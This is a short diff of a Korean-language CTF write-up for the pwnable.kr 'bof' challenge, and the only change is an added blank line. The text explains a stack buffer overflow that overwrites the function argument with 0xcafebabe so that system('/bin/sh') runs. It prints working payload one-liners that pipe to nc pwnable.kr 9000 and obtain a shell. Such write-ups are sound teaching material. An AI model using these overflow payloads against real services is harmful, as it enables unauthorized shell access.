@@ -46,6 +46,7 @@ payload : (python -c "print 'A'*48 + '\x64\x06'") | nc pwnable.kr 9000
 <br/>
 함수 호출이 종료되기 전에 exploit하기 위해서 RET이 아닌 함수 인자 값을 변조하는 공격을 시도한다. overflowme 변수의 위치부터 52bytes(0x2C + 4bytes(SFP) + 4bytes(RET))를 더미 값으로 채우고 함수 인자인 key 값을 0xcafebabe로 변조하여 if 문의 식을 만족시킴으로서 system("/bin/sh")가 실행되도록 한다.
 
+
 ![fig4](https://github.com/tjrkddnr/CTF/blob/master/pwnable/Toddler's%20Bottle/bof/fig4.jpg?raw=true)
 
 **payload : (python -c "print 'A'\*52 + '\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000**
